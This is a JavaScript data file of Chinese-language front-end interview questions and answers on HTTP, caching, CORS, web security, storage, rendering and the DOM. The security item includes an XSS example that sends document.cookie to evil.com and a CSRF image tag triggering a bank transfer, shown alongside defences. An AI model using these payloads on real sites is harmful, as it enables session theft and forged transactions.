export const browserEngineeringQuestions = [
  {
    "id": "be-001",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "easy",
    "tags": [
      "HTTP",
      "HTTPS",
      "加密"
    ],
    "question": "HTTP 和 HTTPS 的区别？HTTPS 的加密原理是什么？",
    "answer": "### 对比\n\n| 特性 | HTTP | HTTPS |\n|------|------|-------|\n| 端口 | 80 | 443 |\n| 加密 | ❌ 明文传输 | ✅ TLS/SSL 加密 |\n| 证书 | 不需要 | 需要 CA 证书 |\n| 性能 | 快 | 略慢（握手开销）|\n| SEO | 无加分 | 搜索引擎优先 |\n| 安全性 | 低（可被中间人攻击）| 高 |\n\n### HTTPS 加密原理\n\nHTTPS = HTTP + TLS/SSL，使用**混合加密**：\n\n**1. 非对称加密（握手阶段）**\n- 客户端连接服务器\n- 服务器返回**证书**（含公钥）\n- 客户端验证证书（CA 签名）\n- 客户端生成**会话密钥**，用公钥加密发给服务器\n- 服务器用私钥解密获得会话密钥\n\n**2. 对称加密（数据传输阶段）**\n- 双方使用会话密钥加密通信内容\n- 对称加密速度快，适合大量数据\n\n### TLS 握手流程（TLS 1.2）\n\n```javascript\nClient                          Server\n  | --- ClientHello --------------> |\n  |     (支持的加密套件、随机数)     |\n  |                                 |\n  | <--- ServerHello -------------- |\n  |     (选择的加密套件、随机数)     |\n  | <--- Certificate -------------- |\n  |     (服务器证书，含公钥)         |\n  | <--- ServerHelloDone ---------- |\n  |                                 |\n  | --- ClientKeyExchange --------> |\n  |     (用公钥加密的会话密钥)       |\n  | --- ChangeCipherSpec ---------> |\n  | --- Finished -----------------> |\n  |                                 |\n  | <--- ChangeCipherSpec --------- |\n  | <--- Finished ---------------- |\n  |                                 |\n  | <=== 加密通信开始 =============> |\n```\n\n### TLS 1.3 改进\n- 握手从 2-RTT 减少到 1-RTT\n- 更安全的加密算法\n- 废弃了不安全的算法\n\n### 为什么不全部用非对称加密\n- 非对称加密计算量大、速度慢\n- 对称加密快 100-1000 倍\n- 所以用非对称加密交换密钥，对称加密传输数据"
  },
  {
    "id": "be-002",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "HTTP",
      "请求方法",
      "状态码"
    ],
    "question": "HTTP 常见请求方法和状态码有哪些？",
    "answer": "### 请求方法\n\n| 方法 | 说明 | 幂等 | 安全 |\n|------|------|------|------|\n| GET | 获取资源 | ✅ | ✅ |\n| POST | 创建资源 | ❌ | ❌ |\n| PUT | 完整更新资源 | ✅ | ❌ |\n| PATCH | 部分更新资源 | ❌ | ❌ |\n| DELETE | 删除资源 | ✅ | ❌ |\n| HEAD | 获取头信息（无响应体）| ✅ | ✅ |\n| OPTIONS | 预检请求（CORS）| ✅ | ✅ |\n\n**幂等**：多次执行结果相同（GET 请求多次结果一致）\n**安全**：不修改服务器数据\n\n### GET vs POST\n\n| 特性 | GET | POST |\n|------|-----|------|\n| 参数位置 | URL query | 请求体 |\n| 长度限制 | 浏览器有限制（~2KB）| 无限制 |\n| 缓存 | ✅ 可缓存 | ❌ 默认不缓存 |\n| 幂等 | ✅ | ❌ |\n| 浏览器历史 | ✅ 保留 | ❌ |\n| 书签 | ✅ 可收藏 | ❌ |\n| 编码 | URL 编码 | 多种（form-data、json）|\n\n### 状态码\n\n**1xx 信息：**\n- 100 Continue — 继续发送请求体\n\n**2xx 成功：**\n- 200 OK — 请求成功\n- 201 Created — 资源创建成功\n- 204 No Content — 成功但无返回内容\n\n**3xx 重定向：**\n- 301 Moved Permanently — 永久重定向（缓存）\n- 302 Found — 临时重定向（不缓存）\n- 304 Not Modified — 资源未修改（使用缓存）\n\n**4xx 客户端错误：**\n- 400 Bad Request — 请求格式错误\n- 401 Unauthorized — 未认证（需要登录）\n- 403 Forbidden — 无权限\n- 404 Not Found — 资源不存在\n- 405 Method Not Allowed — 方法不允许\n- 429 Too Many Requests — 请求频率超限\n\n**5xx 服务器错误：**\n- 500 Internal Server Error — 服务器内部错误\n- 502 Bad Gateway — 网关错误\n- 503 Service Unavailable — 服务不可用\n- 504 Gateway Timeout — 网关超时\n\n### 301 vs 302\n- **301**：永久重定向，浏览器会缓存，下次直接跳转新地址。SEO 权重转移到新 URL\n- **302**：临时重定向，每次都请求原地址。SEO 权重不转移\n\n### RESTful API 设计\n```text\nGET    /users          # 获取用户列表\nGET    /users/:id      # 获取单个用户\nPOST   /users          # 创建用户\nPUT    /users/:id      # 更新用户（全量）\nPATCH  /users/:id      # 更新用户（部分）\nDELETE /users/:id      # 删除用户\n```"
  },
  {
    "id": "be-003",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "HTTP",
      "缓存",
      "强缓存",
      "协商缓存"
    ],
    "question": "浏览器缓存机制是什么？强缓存和协商缓存的区别？",
    "answer": "### 缓存流程\n\n```text\n请求 → 检查强缓存 → 命中？→ 直接使用（不发请求）\n                   ↓ 未命中\n         检查协商缓存 → 命中？→ 304 使用缓存\n                        ↓ 未命中\n                      200 返回新资源\n```\n\n### 强缓存\n\n不发请求，直接从缓存读取。\n\n**HTTP/1.1：Cache-Control（优先）**\n```text\nCache-Control: max-age=3600     # 缓存 3600 秒\nCache-Control: no-cache          # 不直接使用缓存（走协商缓存）\nCache-Control: no-store          # 完全不缓存\nCache-Control: public            # 可被 CDN 等中间缓存\nCache-Control: private           # 只能被浏览器缓存\n```\n\n**HTTP/1.0：Expires（已过时）**\n```text\nExpires: Wed, 09 Aug 2026 00:00:00 GMT  # 绝对过期时间\n```\n\n### 协商缓存\n\n发请求验证缓存是否有效，有效返回 304。\n\n**方式 1：Last-Modified / If-Modified-Since**\n\n```text\n# 首次响应\nLast-Modified: Wed, 09 Aug 2026 00:00:00 GMT\n\n# 再次请求\nIf-Modified-Since: Wed, 09 Aug 2026 00:00:00 GMT\n\n# 服务器比较：\n# 未修改 → 304 Not Modified（不返回响应体）\n# 已修改 → 200 + 新资源 + 新 Last-Modified\n```\n\n**方式 2：ETag / If-None-Match（更精确）**\n\n```text\n# 首次响应\nETag: \"abc123\"\n\n# 再次请求\nIf-None-Match: \"abc123\"\n\n# 服务器比较：\n# ETag 相同 → 304\n# ETag 不同 → 200 + 新资源\n```\n\n### ETag vs Last-Modified\n\n| 特性 | Last-Modified | ETag |\n|------|---------------|------|\n| 精度 | 秒级 | 字节级（哈希）|\n| 性能 | 快（时间比较）| 稍慢（计算哈希）|\n| 准确性 | 低（1秒内修改无法检测）| 高 |\n| 优先级 | 低 | 高 |\n\n### 实际应用\n\n**HTML 文件**：`Cache-Control: no-cache`（协商缓存）\n**JS/CSS 文件**：`Cache-Control: max-age=31536000` + 文件名哈希（强缓存）\n**图片等静态资源**：`Cache-Control: max-age=86400`（强缓存）\n\n```nginx\n# Nginx 配置示例\nlocation ~* \\.(js|css)$ {\n  add_header Cache-Control \"public, max-age=31536000, immutable\";\n}\nlocation ~* \\.(html)$ {\n  add_header Cache-Control \"no-cache\";\n}\n```\n\n### immutable 关键字\n`immutable` 告诉浏览器资源永不过期，即使用户刷新也不验证：\n```text\nCache-Control: max-age=31536000, immutable\n```\n配合文件名哈希（如 `app.a1b2c3.js`），内容变化时文件名变，自动请求新文件。"
  },
  {
    "id": "be-004",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "跨域",
      "CORS",
      "同源策略"
    ],
    "question": "什么是跨域？有哪些解决跨域的方案？",
    "answer": "### 同源策略\n\n浏览器安全策略：**协议、域名、端口**三者完全相同才算同源。不同源的请求默认被浏览器拦截。\n\n### 跨域解决方案\n\n### 1. CORS（最常用）\n\n服务端设置响应头允许跨域：\n\n```text\n# 简单请求\nAccess-Control-Allow-Origin: https://example.com\nAccess-Control-Allow-Credentials: true\n\n# 预检请求响应\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400\n```\n\n**简单请求**条件（同时满足）：\n- 方法为 GET/HEAD/POST\n- Content-Type 为 text/plain、multipart/form-data、application/x-www-form-urlencoded\n- 不含自定义头部\n\n**预检请求**（OPTIONS）：\n- 非简单请求先发 OPTIONS 请求询问是否允许\n- 浏览器根据响应决定是否发送真实请求\n\n```javascript\n// Node.js Express 示例\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', 'https://example.com')\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')\n  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization')\n  if (req.method === 'OPTIONS') {\n    return res.sendStatus(200)\n  }\n  next()\n})\n```\n\n### 2. 代理服务器\n\n```text\n浏览器 → 同源代理服务器 → 目标服务器\n```\n\n```javascript\n// Vite 配置\nexport default {\n  server: {\n    proxy: {\n      '/api': {\n        target: 'http://backend.com',\n        changeOrigin: true,\n        rewrite: path => path.replace(/^\\/api/, '')\n      }\n    }\n  }\n}\n```\n\n### 3. JSONP（已过时）\n\n利用 `<script>` 标签不受同源策略限制：\n\n```javascript\nfunction handleData(data) { console.log(data) }\n\nconst script = document.createElement('script')\nscript.src = 'https://api.example.com/data?callback=handleData'\ndocument.body.appendChild(script)\n// 服务器返回: handleData({ name: 'Tom' })\n```\n- ✅ 兼容老浏览器\n- ❌ 只支持 GET、不安全、已过时\n\n### 4. postMessage（跨窗口通信）\n\n```javascript\n// 父窗口 → iframe\niframe.contentWindow.postMessage('hello', 'https://child.com')\n\n// iframe 接收\nwindow.addEventListener('message', (e) => {\n  if (e.origin === 'https://parent.com') {\n    console.log(e.data)\n  }\n})\n```\n\n### 5. WebSocket\n\nWebSocket 不受同源策略限制：\n\n```javascript\nconst ws = new WebSocket('ws://example.com/socket')\nws.onmessage = (e) => console.log(e.data)\n```\n\n### 带凭证的跨域\n```javascript\nfetch('https://api.example.com/data', {\n  credentials: 'include'  // 携带 Cookie\n})\n// 服务端必须设置\n// Access-Control-Allow-Origin: 具体域名（不能用 *）\n// Access-Control-Allow-Credentials: true\n```"
  },
  {
    "id": "be-005",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "XSS",
      "CSRF",
      "安全"
    ],
    "question": "什么是 XSS 和 CSRF？如何防御？",
    "answer": "### XSS（跨站脚本攻击）\n\n攻击者在页面中注入恶意脚本，在用户浏览器中执行。\n\n**类型：**\n\n1. **存储型 XSS**：恶意代码存入数据库，所有访问者都受影响\n2. **反射型 XSS**：恶意代码在 URL 中，服务器返回到页面\n3. **DOM 型 XSS**：纯前端漏洞，不经过服务器\n\n**攻击示例：**\n```javascript\n// 用户评论中注入\n<script>fetch('https://evil.com?cookie=' + document.cookie)</script>\n\n// 如果没有转义，其他用户看到评论时脚本执行\n```\n\n**防御：**\n\n1. **输出转义**：\n```javascript\nfunction escape(str) {\n  return str\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;')\n}\n```\n\n2. **CSP（内容安全策略）**：\n```html\n<meta http-equiv=\"Content-Security-Policy\" \n      content=\"default-src 'self'; script-src 'self' cdn.example.com\">\n```\n\n3. **HttpOnly Cookie**：\n```text\nSet-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict\n```\n\n4. **使用现代框架**：React/Vue 默认转义\n\n### CSRF（跨站请求伪造）\n\n攻击者诱导用户在已登录的网站上执行非预期操作。\n\n**攻击示例：**\n```html\n<!-- 钓鱼网站 -->\n<img src=\"https://bank.com/transfer?to=hacker&amount=10000\">\n<!-- 用户已登录 bank.com，浏览器自动携带 Cookie -->\n```\n\n**防御：**\n\n1. **CSRF Token**：\n```html\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"_token\" value=\"随机生成的token\">\n  <input type=\"text\" name=\"amount\">\n</form>\n```\n\n2. **SameSite Cookie**：\n```text\nSet-Cookie: token=abc; SameSite=Strict  # 不跨站发送\nSet-Cookie: token=abc; SameSite=Lax     # 仅 GET 跨站发送（默认）\n```\n\n3. **Referer/Origin 校验**：\n```javascript\nconst referer = req.headers.referer\nif (!isAllowedOrigin(referer)) {\n  return res.status(403).send('Forbidden')\n}\n```\n\n### XSS vs CSRF\n\n| 特性 | XSS | CSRF |\n|------|-----|------|\n| 原理 | 注入脚本执行 | 借用用户身份发请求 |\n| 前提 | 网站存在 XSS 漏洞 | 用户已登录目标网站 |\n| 防御 | 转义、CSP、HttpOnly | Token、SameSite、Referer |\n\n### 其他安全威胁\n- **点击劫持**：iframe 嵌套 → `X-Frame-Options: DENY`\n- **SQL 注入**：参数化查询\n- **中间人攻击**：HTTPS"
  },
  {
    "id": "be-006",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "Cookie",
      "localStorage",
      "sessionStorage"
    ],
    "question": "Cookie、localStorage、sessionStorage 的区别？",
    "answer": "### 对比\n\n| 特性 | Cookie | localStorage | sessionStorage |\n|------|--------|-------------|----------------|\n| 大小 | ~4KB | ~5MB | ~5MB |\n| 生命周期 | 可设置过期时间 | 永久 | 关闭标签页清除 |\n| 请求携带 | ✅ 自动携带 | ❌ | ❌ |\n| 作用域 | 域名+路径 | 域名 | 标签页 |\n| API | document.cookie | getItem/setItem | getItem/setItem |\n| 安全 | HttpOnly/Secure | 无 | 无 |\n| 适用 | 认证 Token | 持久化数据 | 临时会话数据 |\n\n### Cookie\n\n```javascript\n// 设置 Cookie\ndocument.cookie = 'name=Tom; max-age=3600; path=/; Secure; SameSite=Strict'\n\n// 读取（返回所有 cookie 字符串）\nconsole.log(document.cookie) // 'name=Tom; age=25'\n\n// 服务器设置\nSet-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict; Max-Age=3600\n```\n\n**Cookie 属性：**\n- `HttpOnly`：JS 不可读取（防 XSS）\n- `Secure`：仅 HTTPS 传输\n- `SameSite=Strict|Lax|None`：跨站发送策略\n- `Max-Age` / `Expires`：过期时间\n- `Domain` / `Path`：作用范围\n\n### localStorage\n\n```javascript\n// 存储\nlocalStorage.setItem('user', JSON.stringify({ name: 'Tom' }))\n\n// 读取\nconst user = JSON.parse(localStorage.getItem('user'))\n\n// 删除\nlocalStorage.removeItem('user')\n\n// 清空所有\nlocalStorage.clear()\n\n// 监听变化（跨标签页通信）\nwindow.addEventListener('storage', (e) => {\n  console.log(e.key, e.newValue)\n})\n```\n\n### sessionStorage\n\n```javascript\n// API 与 localStorage 完全相同\nsessionStorage.setItem('temp', 'data')\nsessionStorage.getItem('temp')\n\n// 生命周期：标签页关闭后清除\n// 同源不同标签页的 sessionStorage 独立\n```\n\n### 使用场景\n\n**Cookie：**\n- 认证 Token（HttpOnly）\n- 用户偏好设置（需要服务器读取的）\n\n**localStorage：**\n- 用户设置（主题、语言）\n- 缓存数据\n- 离线数据\n\n**sessionStorage：**\n- 表单临时数据\n- 单次会话状态\n- 页面间传递临时数据\n\n### Token 存储方案\n\n| 方案 | XSS 风险 | CSRF 风险 | 推荐 |\n|------|----------|----------|------|\n| Cookie (HttpOnly) | 低 | 中 | ✅ 需配合 SameSite |\n| localStorage | 高 | 无 | ❌ JS 可读取 |\n| 内存变量 | 无 | 无 | ✅ 刷新丢失 |\n\n### 最佳实践\n- 认证 Token 存 HttpOnly Cookie\n- 用户偏好存 localStorage\n- 临时数据存 sessionStorage\n- 敏感数据不要存前端"
  },
  {
    "id": "be-007",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "hard",
    "tags": [
      "浏览器渲染",
      "关键渲染路径",
      "DOM"
    ],
    "question": "从输入 URL 到页面展示发生了什么？",
    "answer": "### 完整流程\n\n```text\n1. URL 解析\n2. DNS 查询\n3. TCP 连接（三次握手）\n4. TLS 握手（HTTPS）\n5. 发送 HTTP 请求\n6. 服务器处理请求并返回响应\n7. 浏览器接收响应\n8. 浏览器渲染\n9. 加载执行 JS/CSS\n10. 触发 load 事件\n```\n\n### 1. URL 解析\n```text\nhttps://www.example.com:443/path?query=1#hash\n  │         │           │    │       │     │\n  协议       域名         端口  路径    查询   锚点\n```\n\n### 2. DNS 查询\n```text\n浏览器 DNS 缓存 → 操作系统 DNS 缓存 → 路由器 DNS → ISP DNS → 根域名服务器\n```\n\n### 3. TCP 三次握手\n```text\nClient → SYN → Server\nClient ← SYN+ACK ← Server\nClient → ACK → Server\n（连接建立）\n```\n\n### 4. 浏览器渲染流程\n\n```text\nHTML → DOM 树\n              → 渲染树（Render Tree）\nCSS  → CSSOM 树\n\n渲染树 → 布局（Layout/Reflow）→ 绘制（Paint）→ 合成（Composite）\n```\n\n**详细步骤：**\n\n1. **解析 HTML** → 构建 DOM 树\n2. **解析 CSS** → 构建 CSSOM 树\n3. **合并 DOM 和 CSSOM** → 渲染树（不包含 `display: none` 的元素）\n4. **布局（Layout/Reflow）** → 计算元素位置和大小\n5. **绘制（Paint）** → 将渲染树转为屏幕上的像素\n6. **合成（Composite）** → 将各图层合成最终画面\n\n### 5. JS 执行\n\n```html\n<!-- 阻塞 HTML 解析 -->\n<script src=\"app.js\"></script>\n\n<!-- 不阻塞（异步下载，DOMContentLoaded 后执行 -->\n<script defer src=\"app.js\"></script>\n\n<!-- 不阻塞（异步下载，下载完立即执行）-->\n<script async src=\"analytics.js\"></script>\n```\n\n### 6. 事件触发\n\n```text\nDOM 解析完成 → DOMContentLoaded\n图片等资源加载完成 → load\n```\n\n### 性能优化点\n1. **DNS 预解析**：`<link rel=\"dns-prefetch\" href=\"//cdn.example.com\">`\n2. **预连接**：`<link rel=\"preconnect\" href=\"//cdn.example.com\">`\n3. **减少请求**：合并文件、雪碧图\n4. **压缩**：Gzip/Brotli\n5. **缓存**：强缓存 + 协商缓存\n6. **CDN**：就近访问\n7. **懒加载**：图片/组件按需加载"
  },
  {
    "id": "be-008",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "hard",
    "tags": [
      "重排",
      "重绘",
      "渲染性能"
    ],
    "question": "浏览器的重排（Reflow）和重绘（Repaint）是什么？如何优化？",
    "answer": "### 概念\n\n**重排（Reflow）**：元素的大小、位置发生变化，浏览器重新计算布局。\n\n**重绘（Repaint）**：元素外观变化（颜色、背景等），但不影响布局，浏览器重新绘制。\n\n```text\n重排一定会触发重绘，重绘不一定会触发重排\n```\n\n### 触发重排的操作\n\n- 添加/删除可见 DOM 元素\n- 元素位置、尺寸变化（width、height、margin、padding）\n- 内容变化（文字数量、图片大小）\n- 窗口 resize\n- 激活 CSS 伪类（:hover）\n- 计算 `offsetWidth`、`scrollTop` 等布局属性\n- 设置 `style` 属性\n\n### 触发重绘的操作\n\n- color、background、border-color\n- box-shadow、text-decoration\n- visibility（不触发布局变化）\n\n### 优化策略\n\n**1. 减少 DOM 操作**\n\n```javascript\n// ❌ 每次操作都触发重排\nfor (let i = 0; i < 100; i++) {\n  el.style.left = i + 'px'\n}\n\n// ✅ 使用 transform（只触发合成）\nel.style.transform = 'translateX(100px)'\n\n// ✅ 使用 class 替代多次 style 操作\nel.className = 'moved' // 一次重排\n```\n\n**2. 批量 DOM 修改**\n\n```javascript\n// ❌ 多次读写交替触发强制重排\nconst width = el.offsetWidth  // 读\nel.style.width = width + 10 + 'px'  // 写\nconst height = el.offsetHeight  // 读（强制重排）\nel.style.height = height + 10 + 'px'  // 写\n\n// ✅ 先读后写\nconst width = el.offsetWidth  // 读\nconst height = el.offsetHeight  // 读\nel.style.width = width + 10 + 'px'  // 写\nel.style.height = height + 10 + 'px'  // 写\n```\n\n**3. 使用 DocumentFragment**\n\n```javascript\nconst fragment = document.createDocumentFragment()\nfor (let i = 0; i < 100; i++) {\n  const li = document.createElement('li')\n  li.textContent = `Item ${i}`\n  fragment.appendChild(li)\n}\nul.appendChild(fragment) // 只触发一次重排\n```\n\n**4. 隐藏 → 修改 → 显示**\n\n```javascript\nel.style.display = 'none'  // 一次重排\n// 大量修改...\nel.style.display = 'block'  // 一次重排\n```\n\n**5. 使用 transform 和 opacity**\n\n```css\n/* ❌ 触发重排 */\n.animate { left: 100px; top: 100px; }\n\n/* ✅ 只触发合成层 */\n.animate { transform: translate(100px, 100px); }\n```\n\n**6. 使用 will-change**\n\n```css\n.animated-element {\n  will-change: transform;  /* 提前创建合成层 */\n}\n```\n\n**7. 使用 requestAnimationFrame**\n\n```javascript\nfunction animate() {\n  // 在帧开始时执行\n  requestAnimationFrame(() => {\n    el.style.transform = 'translateX(100px)'\n  })\n}\n```\n\n### 强制同步布局（Layout Thrashing）\n\n```javascript\n// ❌ 读后写交替，导致强制重排\nelements.forEach(el => {\n  const height = el.offsetHeight  // 读 → 触发重排\n  el.style.height = height + 10 + 'px'  // 写 → 使下一次读触发重排\n})\n\n// ✅ 分离读写\nconst heights = elements.map(el => el.offsetHeight)  // 全部读\nelements.forEach((el, i) => {\n  el.style.height = heights[i] + 10 + 'px'  // 全部写\n})\n```\n\n### 只读属性会触发重排\n`offsetWidth`、`offsetHeight`、`clientWidth`、`scrollTop`、`getComputedStyle()` 等会**强制浏览器执行待处理的布局变更**，应尽量减少调用。"
  },
  {
    "id": "be-009",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "事件模型",
      "冒泡",
      "捕获",
      "事件委托"
    ],
    "question": "浏览器的事件模型是什么？事件委托的原理？",
    "answer": "### 事件流三个阶段\n\n```text\n1. 捕获阶段（Capture）：从 window → 目标元素的祖先\n2. 目标阶段（Target）：到达目标元素\n3. 冒泡阶段（Bubble）：从目标元素 → window\n```\n\n```javascript\n// 第三个参数：true = 捕获阶段监听，false/默认 = 冒泡阶段监听\nelement.addEventListener('click', handler, false) // 冒泡\nelement.addEventListener('click', handler, true)  // 捕获\n\n// stopPropagation：阻止事件传播\nelement.addEventListener('click', (e) => {\n  e.stopPropagation() // 阻止冒泡\n})\n\n// stopImmediatePropagation：阻止同元素上其他监听器执行\nelement.addEventListener('click', (e) => {\n  e.stopImmediatePropagation()\n})\n```\n\n### 事件委托\n\n利用事件冒泡，在父元素上统一处理子元素的事件。\n\n```javascript\n// ❌ 为每个 li 绑定事件\ndocument.querySelectorAll('li').forEach(li => {\n  li.addEventListener('click', handleClick)\n})\n\n// ✅ 事件委托：在父元素上绑定一次\ndocument.querySelector('ul').addEventListener('click', (e) => {\n  if (e.target.tagName === 'LI') {\n    console.log(e.target.textContent)\n  }\n})\n```\n\n### 事件委托优势\n\n1. **减少事件监听器数量**，节省内存\n2. **动态元素自动处理**：后添加的 li 也能响应点击\n3. **方便管理**：统一在一个地方处理\n\n### 事件委托 + data 属性\n\n```html\n<div id=\"toolbar\">\n  <button data-action=\"save\">保存</button>\n  <button data-action=\"delete\">删除</button>\n  <button data-action=\"cancel\">取消</button>\n</div>\n```\n\n```javascript\ndocument.getElementById('toolbar').addEventListener('click', (e) => {\n  const action = e.target.closest('[data-action]')?.dataset.action\n  if (!action) return\n  \n  switch (action) {\n    case 'save': saveData(); break\n    case 'delete': deleteData(); break\n    case 'cancel': cancelAction(); break\n  }\n})\n```\n\n### closest 方法\n`closest()` 从当前元素向上查找匹配的祖先（包括自身），非常适合事件委托：\n```javascript\n// 点击按钮内的 span 时也能找到 button\nbutton.addEventListener('click', (e) => {\n  const btn = e.target.closest('button')\n  if (btn) handleClick(btn)\n})\n```\n\n### 不适合事件委托的事件\n- `focus` / `blur`（不冒泡，可用 `focusin` / `focusout` 替代）\n- `mouseenter` / `mouseleave`（不冒泡，可用 `mouseover` / `mouseout` 替代）\n- `load` / `unload` / `error`\n\n### 事件循环与事件\n点击事件在**宏任务**中执行。如果事件处理函数中有异步操作，注意事件可能在异步操作完成前被再次触发。"
  },
  {
    "id": "be-010",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "DOM",
      "操作",
      "性能"
    ],
    "question": "什么是 DOM？常见 DOM 操作有哪些？",
    "answer": "### DOM（Document Object Model）\n\nDOM 是 HTML/XML 文档的编程接口，将文档表示为树形结构，JavaScript 可以通过 DOM API 操作页面内容。\n\n```text\ndocument\n  └── html\n       ├── head\n       │    ├── title\n       │    └── meta\n       └── body\n            ├── div\n            │    └── p\n            └── script\n```\n\n### 获取元素\n\n```javascript\n// 现代 API\ndocument.querySelector('#id')        // CSS 选择器，返回第一个\ndocument.querySelectorAll('.class')  // 返回 NodeList\n\n// 传统 API\ndocument.getElementById('id')\ndocument.getElementsByClassName('class')  // HTMLCollection（动态）\ndocument.getElementsByTagName('div')      // HTMLCollection（动态）\n```\n\n### 创建和添加\n\n```javascript\n// 创建\nconst div = document.createElement('div')\ndiv.textContent = 'Hello'\ndiv.className = 'box'\ndiv.setAttribute('data-id', '1')\n\n// 添加\ndocument.body.appendChild(div)           // 追加到末尾\ndocument.body.insertBefore(div, refEl)   // 在指定元素前插入\ndocument.body.append(div, 'text')        // 支持多参数和文本\n\n// 现代 API\nparentEl.prepend(newEl)    // 开头插入\nparentEl.before(newEl)     // 元素前插入\nparentEl.after(newEl)      // 元素后插入\n```\n\n### 删除和替换\n\n```javascript\n// 删除\nel.remove()                      // 现代 API\nparentEl.removeChild(el)         // 传统 API\n\n// 替换\nparentEl.replaceChild(newEl, oldEl)\noldEl.replaceWith(newEl)         // 现代 API\n```\n\n### 修改内容和属性\n\n```javascript\n// 内容\nel.textContent = '纯文本'         // 安全（自动转义）\nel.innerHTML = '<b>HTML</b>'     // 可解析 HTML（注意 XSS）\nel.innerText = '可见文本'         // 触发重排\n\n// 属性\nel.id = 'myId'\nel.className = 'box active'\nel.classList.add('active')        // 添加 class\nel.classList.remove('active')     // 移除 class\nel.classList.toggle('active')     // 切换 class\nel.classList.contains('active')   // 是否包含\n\n// dataset\nel.dataset.userId = '123'        // data-user-id=\"123\"\n\n// 样式\nel.style.color = 'red'\nel.style.setProperty('--custom', 'value')\n```\n\n### 遍历\n\n```javascript\nel.parentNode        // 父节点\nel.parentElement     // 父元素节点\nel.children          // 子元素集合\nel.firstChild        // 第一个子节点（可能是文本节点）\nel.firstElementChild // 第一个元素子节点\nel.nextElementSibling // 下一个兄弟元素\n```\n\n### 性能优化\n\n**1. 使用 DocumentFragment 批量操作**\n```javascript\nconst fragment = document.createDocumentFragment()\nitems.forEach(item => {\n  const li = document.createElement('li')\n  li.textContent = item\n  fragment.appendChild(li)\n})\nul.appendChild(fragment) // 只触发一次重排\n```\n\n**2. cloneNode 替代 createElement**\n```javascript\nconst template = document.createElement('div')\ntemplate.className = 'item'\ntemplate.innerHTML = '<span></span>'\n\nconst clone = template.cloneNode(true) // 深拷贝\nclone.querySelector('span').textContent = 'Hello'\n```\n\n**3. innerHTML vs createElement**\n`innerHTML` 解析 HTML 字符串，大量元素时比 createElement 快，但有 XSS 风险。\n\n### MutationObserver（监听 DOM 变化）\n```javascript\nconst observer = new MutationObserver((mutations) => {\n  mutations.forEach(m => console.log(m.type))\n})\nobserver.observe(el, { childList: true, subtree: true, attributes: true })\n```"
  },
  {
    "id": "be-011",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "存储",
      "IndexedDB",
      "离线"
    ],
    "question": "前端数据存储方案有哪些？IndexedDB 的优势是什么？",
    "answer": "### 存储方案对比\n\n| 方案 | 容量 | 类型 | 异步 | 适用场景 |\n|------|------|------|------|----------|\n| Cookie | ~4KB | 字符串 | ❌ | 认证凭证 |\n| localStorage | ~5MB | 字符串 | ❌ | 简单 KV |\n| sessionStorage | ~5MB | 字符串 | ❌ | 会话数据 |\n| IndexedDB | ~50MB+ | 结构化 | ✅ | 大量数据 |\n| Cache API | ~50MB+ | Response | ✅ | PWA 离线 |\n\n### IndexedDB\n\n浏览器端的 NoSQL 数据库，支持事务、索引、游标。\n\n```javascript\n// 打开数据库\nconst request = indexedDB.open('MyDB', 1)\n\nrequest.onupgradeneeded = (e) => {\n  const db = e.target.result\n  // 创建对象仓库（表）\n  if (!db.objectStoreNames.contains('users')) {\n    const store = db.createObjectStore('users', { keyPath: 'id' })\n    store.createIndex('name', 'name', { unique: false })\n  }\n}\n\nrequest.onsuccess = (e) => {\n  const db = e.target.result\n  // 添加数据\n  const tx = db.transaction('users', 'readwrite')\n  const store = tx.objectStore('users')\n  store.add({ id: 1, name: 'Tom', age: 25 })\n  \n  // 读取数据\n  store.get(1).onsuccess = (e) => {\n    console.log(e.target.result) // { id: 1, name: 'Tom', age: 25 }\n  }\n  \n  // 遍历\n  store.openCursor().onsuccess = (e) => {\n    const cursor = e.target.result\n    if (cursor) {\n      console.log(cursor.value)\n      cursor.continue()\n    }\n  }\n}\n```\n\n### IndexedDB 优势\n\n1. **大容量**：通常 50MB-1GB（浏览器实现）\n2. **结构化数据**：支持对象、数组、Blob\n3. **异步 API**：不阻塞主线程\n4. **事务支持**：保证数据一致性\n5. **索引**：高效查询\n6. **同源策略**：安全隔离\n\n### 封装 IndexedDB（Promise 版）\n\n```javascript\nfunction openDB(name, version, upgradeCallback) {\n  return new Promise((resolve, reject) => {\n    const req = indexedDB.open(name, version)\n    req.onupgradeneeded = (e) => upgradeCallback(e.target.result)\n    req.onsuccess = (e) => resolve(e.target.result)\n    req.onerror = (e) => reject(e.target.error)\n  })\n}\n\nfunction put(db, store, data) {\n  return new Promise((resolve, reject) => {\n    const tx = db.transaction(store, 'readwrite')\n    tx.objectStore(store).put(data)\n    tx.oncomplete = () => resolve(data)\n    tx.onerror = () => reject(tx.error)\n  })\n}\n```\n\n### Cache API（PWA 离线）\n\n```javascript\n// 缓存资源\nconst cache = await caches.open('v1')\nawait cache.addAll([\n  '/',\n  '/styles.css',\n  '/app.js'\n])\n\n// 从缓存读取\nconst cached = await caches.match('/styles.css')\n\n// Service Worker 中拦截请求\nself.addEventListener('fetch', (e) => {\n  e.respondWith(\n    caches.match(e.request).then(cached => \n      cached || fetch(e.request)\n    )\n  